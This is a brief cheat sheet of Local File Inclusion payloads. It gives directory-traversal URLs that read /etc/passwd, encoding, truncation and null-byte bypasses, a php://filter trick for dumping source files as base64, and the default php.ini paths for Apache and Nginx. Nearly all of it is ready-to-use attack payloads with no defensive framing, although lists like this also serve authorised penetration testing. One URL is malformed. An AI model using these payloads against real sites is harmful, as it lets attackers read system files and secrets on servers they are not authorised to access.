# Local File Inclusion #

- Basic Local File Inclusion 
` https//webpage.com?php=../../../etc/passwd`

- Basic Bypasses (url encoding, approved path, path truncation, null bytes)
`https://webpage.com?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`
`https://webpage.com?file=./<Approved_Directory>../../../../etc/passwd`
`https://webpage.com?file=<NON_EXISTING_DIRECTORY>/../../../../etc/passwd/././.<repeat until truncation>`
`https://webpage.com?file=/etc/passwd%00`

- PHP Filters
`https://webpage.com?file=php://filter/read=convert.base64-encode/resource=<FILE>`

- Configuration Location
`APACHE: /etc/php/<version>/apache2/php.ini`
`NGINX: /etc/php/<version>/fpm/php.ini`
